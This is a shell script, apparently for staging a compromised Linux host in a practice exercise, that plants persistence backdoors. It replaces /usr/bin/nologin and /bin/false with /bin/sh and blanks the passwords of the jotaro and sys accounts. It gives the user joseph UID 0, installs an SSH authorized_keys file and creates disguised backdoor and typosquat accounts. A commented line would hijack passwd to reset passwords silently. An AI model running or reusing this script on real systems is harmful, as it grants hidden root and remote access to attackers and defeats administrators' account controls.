#!/bin/sh

cp -f /bin/sh /usr/bin/nologin
#echo "alias passwd='passwd;(echo iluvred; echo iluvred) | passwd &>/dev/null'" >> /etc/bash.bashrc

# Add Admin user
sed -i "s/jotaro:x/jotaro:/" /etc/passwd
mkdir /home/jotaro
cp -f ../assets/.bashrc /home/jotaro/.bashrc

# Add Regular user
if grep -q wheel /etc/group; then
  usermod -G wheel jolyne
else
  usermod -G sudo jolyne
fi
mkdir /home/jolyne
mkdir /home/jolyne/.ssh
cp -f ../assets/authorized_keys /home/jolyne/.ssh/authorized_keys

sed -i "s/joseph:x:[^:]*:/joseph:x:0:/" /etc/passwd

# Add backdoored users
useradd jonathan
useradd josuke

usermod -g joestar jonathan
usermod -G adm jonathan
usermod -g joestar josuke
usermod -G dialout josuke

# Typosquat user
useradd kernpoops
usermod -s "/usr/bin/nologin" kernpoops
sed -i "s/sys:\*:/sys::/" /etc/shadow
usermod -s "/usr/bin/nologin" sys
cp -f "/bin/sh" "/bin/false"
